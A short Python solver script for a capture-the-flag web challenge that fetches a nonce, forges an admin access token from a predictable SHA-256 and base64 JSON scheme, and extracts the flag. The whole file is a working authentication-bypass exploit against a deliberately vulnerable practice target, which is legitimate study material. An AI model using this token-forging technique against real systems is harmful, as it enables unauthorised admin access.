#!/usr/bin/env python3
import hashlib, json, base64, requests, re

def generate_token(nonce: str):
    username = 'admin'
    secret = hashlib.sha256(username.encode() + nonce.encode()).hexdigest()
    bundle = {'user':username,
     'secret':secret}
    return base64.b64encode(json.dumps(bundle).encode())

URL = "http://secureaccess.challs.olicyber.it/"
s = requests.Session()
s.get(URL) # get the session cookie
token = str(s.get(URL + "stage2", params = {"username" : "admin"}).text) # get the nonce
nonce = re.findall(r"[\w]{8}-[\w]{4}-[\w]{4}-[\w]{4}-[\w]{12}", token)

access_token = generate_token(nonce[0])

r = s.post(URL + "stage2", data = {"token" : access_token.decode()})
flag = re.findall(r"ptm{[\w]*}", r.text)
print(flag[0])
